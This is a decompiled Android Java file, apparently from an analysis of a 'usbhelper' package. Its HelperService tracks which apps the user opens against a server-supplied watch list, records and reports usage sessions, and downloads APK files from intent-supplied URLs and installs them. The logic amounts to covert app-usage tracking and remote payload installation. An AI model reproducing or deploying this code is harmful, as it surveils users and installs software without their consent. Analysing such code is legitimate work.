package com.service.usbhelper.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import android.text.TextUtils;
import com.service.usbhelper.MainActivity;
import com.service.usbhelper.connection.ConnectionService;
import com.service.usbhelper.d.f;
import com.service.usbhelper.d.j;
import com.service.usbhelper.d.k;
import com.service.usbhelper.d.m;
import com.service.usbhelper.data.i;
import java.io.File;
import java.util.List;

public class HelperService extends Service
  implements d
{
  public static c a = c.e;
  public static String b = "HelperService";
  BroadcastReceiver c = new b(this);
  private com.service.usbhelper.c.b d;
  private List<String> e;
  private e f;
  private SharedPreferences g;

  private void a(Context paramContext, String paramString)
  {
    if ((paramContext == null) || (TextUtils.isEmpty(paramString)))
      return;
    this.g = k.a(paramContext, paramString);
    SharedPreferences.Editor localEditor = this.g.edit();
    int i = f.a();
    int j = this.g.getInt("app_start_stamp", 0);
    int k = this.g.getInt("app_end_stamp", 0);
    int m = this.g.getInt("app_duration", 0);
    int n = this.g.getInt("app_sessionid", 0);
    int i1 = this.g.getInt("app_is_start_sended", 0);
    String str = this.g.getString("app_appid", "");
    if (TextUtils.isEmpty(str))
      str = d(paramContext, paramString);
    j.b("sessionid: " + i + "\t preStart:" + j + "\t preEnd:" + k + "\n preDuration:" + m + "\t preSessionid" + n);
    if ((n == 0) || (j == 0) || (k == 0) || (m == 0))
    {
      localEditor.putString("app_pkgname", paramString);
      localEditor.putInt("app_start_stamp", i);
      localEditor.putInt("app_end_stamp", i);
      localEditor.putInt("app_sessionid", i);
      localEditor.putInt("app_duration", 0);
      localEditor.putInt("app_is_start_sended", 0);
      localEditor.putString("app_appid", str);
      localEditor.commit();
      j.b("第三方第一次打开，发送启动信息");
      com.service.usbhelper.data.a.b(com.service.usbhelper.data.a.b(paramContext), paramContext);
      return;
    }
    j.b("本次启动session:" + i + "\t 上次结束 ：" + k);
    if (i - k > 30)
    {
      ContentValues localContentValues = new ContentValues();
      if (n == 0)
        n = i;
      if (m > 0)
      {
        localContentValues.put("usbhelper_session", Integer.valueOf(n));
        localContentValues.put("usbhelper_package_name", paramString);
        localContentValues.put("usbhelper_duration", Integer.valueOf(m));
        localContentValues.put("usbhelper_is_start_sended", Integer.valueOf(i1));
        localContentValues.put("usbhelper_appid", str);
        com.service.usbhelper.db.b.a(paramContext, localContentValues);
      }
      localEditor.putInt("app_start_stamp", i);
      localEditor.putInt("app_end_stamp", i);
      localEditor.putInt("app_sessionid", i);
      localEditor.putInt("app_duration", 0);
      localEditor.putInt("app_is_start_sended", 0);
      localEditor.commit();
      j.a("第三方app 距离上次打开超过30秒发送 启动数据");
      com.service.usbhelper.data.a.b(com.service.usbhelper.data.a.b(paramContext), paramContext);
      return;
    }
    j.b("第二次打开，和上次间隔< 30s");
    localEditor.putInt("app_end_stamp", i);
    localEditor.putInt("app_duration", m + (i - k));
    localEditor.commit();
  }

  private void b()
  {
    if (this.f == null)
    {
      this.f = e.a(getApplicationContext(), this);
      this.f.start();
    }
  }

  private void b(Context paramContext, String paramString)
  {
    if ((paramContext == null) || (TextUtils.isEmpty(paramString)))
      return;
    this.g = k.a(paramContext, paramString);
    SharedPreferences.Editor localEditor = this.g.edit();
    int i = f.a();
    int j = this.g.getInt("app_sessionid", 0);
    int k = this.g.getInt("app_start_stamp", 0);
    int m = this.g.getInt("app_end_stamp", 0);
    int n = this.g.getInt("app_duration", 0);
    int i1 = this.g.getInt("app_is_start_sended", 0);
    String str = this.g.getString("app_appid", "");
    if (TextUtils.isEmpty(str))
      str = d(paramContext, paramString);
    if ((j == 0) || (k == 0) || (m == 0))
    {
      localEditor.putInt("app_start_stamp", i);
      localEditor.putInt("app_end_stamp", i);
      localEditor.putInt("app_sessionid", i);
      localEditor.putInt("app_duration", 0);
      localEditor.putString("app_appid", str);
      localEditor.commit();
      return;
    }
    j.b("本次启动session:" + i + "\t 上次结束 ：" + m);
    if ((m >= k) && (i - m > 60))
    {
      j.b("本次启动距上次结束超过60s");
      ContentValues localContentValues = new ContentValues();
      if (j == 0)
        j = i;
      if (n > 0)
      {
        localContentValues.put("usbhelper_session", Integer.valueOf(j));
        localContentValues.put("usbhelper_package_name", paramString);
        localContentValues.put("usbhelper_duration", Integer.valueOf(n));
        localContentValues.put("usbhelper_is_start_sended", Integer.valueOf(i1));
        localContentValues.put("usbhelper_appid", str);
        com.service.usbhelper.db.b.a(paramContext, localContentValues);
      }
      localEditor.putInt("app_start_stamp", i);
      localEditor.putInt("app_end_stamp", i);
      localEditor.putInt("app_sessionid", i);
      localEditor.putInt("app_duration", 0);
      localEditor.putInt("app_is_start_sended", 0);
      localEditor.commit();
      com.service.usbhelper.data.a.b(com.service.usbhelper.data.a.b(paramContext), paramContext);
      return;
    }
    localEditor.putInt("app_end_stamp", i);
    localEditor.putInt("app_duration", n + (i - m));
    localEditor.commit();
  }

  private void c()
  {
    IntentFilter localIntentFilter = new IntentFilter();
    localIntentFilter.addAction("android.intent.action.SCREEN_OFF");
    localIntentFilter.addAction("android.intent.action.SCREEN_ON");
    registerReceiver(this.c, localIntentFilter);
  }

  private void c(Context paramContext, String paramString)
  {
    j.a("refreshServerWatchListAfterAppAdded" + paramString);
    if ((paramContext == null) || (TextUtils.isEmpty(paramString)))
      return;
    SharedPreferences localSharedPreferences = k.a(paramContext);
    int i = localSharedPreferences.getInt("refresh_server_watch_list_stamp", 0);
    j.a("before:" + i);
    int j = f.a(paramContext, f.a());
    if ((i == 0) || (j == 0) || (i != j))
    {
      com.service.usbhelper.d.c.e(paramContext);
      if (j == 0)
        j = f.a(paramContext, f.a());
      localSharedPreferences.edit().putInt("refresh_server_watch_list_stamp", j).commit();
      return;
    }
    try
    {
      j.a("save info " + paramString);
      com.service.usbhelper.d.c.c(paramContext, paramString);
      e.g = true;
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }

  private static String d(Context paramContext, String paramString)
  {
    String str;
    if ((paramContext == null) || (TextUtils.isEmpty(paramString)))
      str = null;
    String[] arrayOfString;
    do
    {
      return str;
      j.a("getPackageAppid" + paramString);
      arrayOfString = k.a(paramContext, "watch_list").getString(paramString, "").split(",");
      str = "";
    }
    while ((arrayOfString == null) || (arrayOfString.length <= 0));
    return arrayOfString[0];
  }

  public void a(String paramString)
  {
    if ((this.e != null) && (this.e.size() > 0) && (!TextUtils.isEmpty(paramString)) && (this.e.contains(paramString)))
    {
      j.a("running package:" + paramString);
      b(getApplicationContext(), paramString);
    }
  }

  public void a(String paramString1, String paramString2)
  {
    this.e = com.service.usbhelper.d.c.f(getApplicationContext());
    j.b("running:" + paramString1 + "next:" + paramString2);
    j.a("watchapps:" + this.e);
    if ((this.e != null) && (this.e.size() > 0) && (!TextUtils.isEmpty(paramString2)) && (this.e.contains(paramString2)))
    {
      j.a("change app : running +" + paramString1 + "next;" + paramString2);
      a(getApplicationContext(), paramString2);
    }
  }

  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }

  public void onCreate()
  {
    super.onCreate();
    j.a("oncreate service");
    this.e = com.service.usbhelper.d.c.f(getApplicationContext());
    this.f = e.a(getApplicationContext(), this);
    this.f.start();
    try
    {
      c();
      j.a("service 中 oncreate 发送统计模块自身启动日志");
      com.service.usbhelper.data.a.a(3, getApplicationContext());
      com.service.usbhelper.a.a.a(getApplicationContext());
      j.a("diff", "usbHelper,Create");
      i.a(getApplicationContext());
      startService(new Intent(getApplicationContext(), ConnectionService.class));
      return;
    }
    catch (Exception localException)
    {
      while (true)
        localException.printStackTrace();
    }
  }

  public void onDestroy()
  {
    super.onDestroy();
    try
    {
      if (this.c != null)
        unregisterReceiver(this.c);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }

  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    int i = 1;
    j.a("helper service onstartcommand----" + paramIntent);
    if (paramIntent != null)
    {
      a = (c)paramIntent.getSerializableExtra("service_action");
      if (a == null)
        a = c.e;
      String str1 = paramIntent.getStringExtra("pkgName");
      if (!TextUtils.isEmpty(str1))
        com.service.usbhelper.data.a.a(4, getApplicationContext(), str1);
      j.a("------" + a);
      switch (a()[a.ordinal()])
      {
      default:
      case 1:
      case 2:
      case 3:
      case 5:
      case 7:
      case 4:
      case 6:
      case 8:
      }
    }
    while (true)
    {
      i = super.onStartCommand(paramIntent, i, paramInt2);
      return i;
      String str3 = paramIntent.getStringExtra("downurl");
      String str4 = paramIntent.getStringExtra("filename");
      long l = Long.parseLong(paramIntent.getStringExtra("filesize"));
      String str5 = com.service.usbhelper.d.b.b() + "/Android/data/com.book2345.reader/apk" + "/" + str4;
      File localFile = new File(str5);
      if ((localFile.exists()) && (l == localFile.length()))
      {
        m.b(getApplicationContext(), str5);
      }
      else
      {
        this.d = new com.service.usbhelper.c.b(getApplicationContext(), str4);
        new com.service.usbhelper.c.c(str3, str5, false, i, this.d).a();
        continue;
        j.a("startMainActivity");
        Intent localIntent = new Intent(this, MainActivity.class);
        localIntent.setFlags(268435456);
        startActivity(localIntent);
        continue;
        j.a("startMonitorApp");
        b();
        continue;
        j.a("initService");
        this.e = com.service.usbhelper.d.c.f(getApplicationContext());
        b();
        continue;
        j.a("package added");
        String str2 = paramIntent.getStringExtra("package");
        c(getApplicationContext(), str2);
        this.e = com.service.usbhelper.d.c.f(getApplicationContext());
        i.a(getApplicationContext(), str2);
        continue;
        b();
        continue;
        j.a("netStateChanged");
        continue;
        j.a("usbStateChanged，发送统计模块自身运行数据");
        b();
        com.service.usbhelper.data.a.a(6, getApplicationContext());
      }
    }
  }
}

/* Location:           C:\Users\Tato\Desktop\android反编译\usbhelper\classes_dex2jar.jar
 * Qualified Name:     com.service.usbhelper.service.HelperService
 * JD-Core Version:    0.6.2
 */